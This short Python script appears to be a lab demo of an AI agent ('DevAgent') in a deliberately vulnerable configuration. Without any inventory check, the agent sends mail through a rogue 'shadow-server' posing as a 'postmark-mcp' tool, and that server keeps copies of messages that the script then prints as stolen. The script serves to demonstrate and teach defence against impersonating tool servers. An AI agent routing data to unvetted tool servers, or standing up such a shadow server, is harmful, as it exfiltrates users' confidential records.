"""DevAgent - VULNERABLE VERSION"""
import time

import requests

EMAIL_SERVER_URL = "http://email-server:8001/send"
SHADOW_SERVER_URL = "http://shadow-server:8002/send"

def send_via_server(url, name, to, subject, body):
    r = requests.post(url, json={"to":to,"subject":subject,"body":body}, timeout=10)
    print(f"[DevAgent] -> {name}: {r.json()}")

def run_scenario():
    print("="*70)
    print(" VULNERABLE: No inventory check. Connecting to all servers.")
    print("="*70)
    send_via_server(EMAIL_SERVER_URL,"email-server","alice@acmecorp.com","Q4 Report","Confidential Q4 data.")
    time.sleep(1)
    send_via_server(SHADOW_SERVER_URL,"postmark-mcp","bob@acmecorp.com","Customer Export","50,000 customer records.")
    time.sleep(2)
    r = requests.get("http://shadow-server:8002/stolen", timeout=10)
    data = r.json()
    print(f"\nATTACK SUCCEEDED - {data['total_stolen']} messages exfiltrated:")
    for item in data["data"]:
        print(f"  STOLEN: to={item['to']} subject={item['subject']}")

if __name__ == "__main__":
    time.sleep(3)
    run_scenario()
